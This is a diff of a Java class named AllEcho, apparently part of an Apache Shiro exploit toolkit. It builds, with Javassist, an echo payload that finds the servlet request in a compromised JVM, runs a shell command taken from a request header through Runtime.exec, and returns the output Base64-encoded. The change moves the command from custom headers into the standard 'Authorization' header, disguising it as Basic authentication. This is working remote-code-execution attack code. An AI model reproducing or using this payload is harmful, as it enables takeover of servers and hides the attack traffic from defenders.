@@ -28,14 +28,14 @@ public class AllEcho implements EchoPayload {
 
 
 
-        clazz.addMethod(CtMethod.make("    private static void p(Object o, int depth){\n" +
+        clazz.addMethod(CtMethod.make("private static void p(Object o, int depth){\n" +
                 "        if(depth > 52||(r !=null&& p !=null)){\n" +
                 "            return;\n" +
                 "        }\n" +
                 "        if(!i(o)){\n" +
                 "            if(r ==null&&javax.servlet.http.HttpServletRequest.class.isAssignableFrom(o.getClass())){\n" +
                 "                r = (javax.servlet.http.HttpServletRequest)o;\n" +
-                "                if(r.getHeader(\"Ctmd\")==null && r.getHeader(\"c\") == null) {\n" +
+                "                if(r.getHeader(\"Host\")==null && r.getHeader(\"Authorization\") == null) {\n" +
                 "                    r = null;\n" +
                 "                }else{\n" +
                 "                    try {\n" +
@@ -50,13 +50,13 @@ public class AllEcho implements EchoPayload {
                 "            if(r !=null&& p !=null){\n" +
                 "                try {\n" +
                 "                    \n" +
-                "                    if (r.getHeader(\"Ctmd\") != null) {\n" +
-                "                        p.addHeader(\"techo\",r.getHeader(\"Ctmd\"));\n" +
-                "                    }else {\n" +
-                "                        p.getWriter().println(\"$$$\" +  org.apache.shiro.codec.Base64.encodeToString(new java.util.Scanner(Runtime.getRuntime().exec(org.apache.shiro.codec.Base64.decodeToString(r.getHeader(\"c\"))).getInputStream()).useDelimiter(\"\\\\A\").next().getBytes()) + \"$$$\");\n" +
-                "                        p.getWriter().flush();\n" +
-                "                        p.getWriter().close();\n" +
-                "                    }\n" +
+                "                    p.addHeader(\"Host\",r.getHeader(\"Host\"));\n" +
+                "                    try {\n" +
+                "                        p.getWriter().println(\"$$$\" +  org.apache.shiro.codec.Base64.encodeToString(new java.util.Scanner(Runtime.getRuntime().exec(org.apache.shiro.codec.Base64.decodeToString(r.getHeader(\"Authorization\").replaceAll(\"Basic \",\"\"))).getInputStream()).useDelimiter(\"\\\\A\").next().getBytes()) + \"$$$\");\n" +
+                "                    }catch (Exception e){}\n" +
+                "                   \n" +
+                "                    p.getWriter().flush();\n" +
+                "                    p.getWriter().close();\n" +
                 "                    \n" +
                 "\n" +
                 "                }catch (Exception e){\n" +
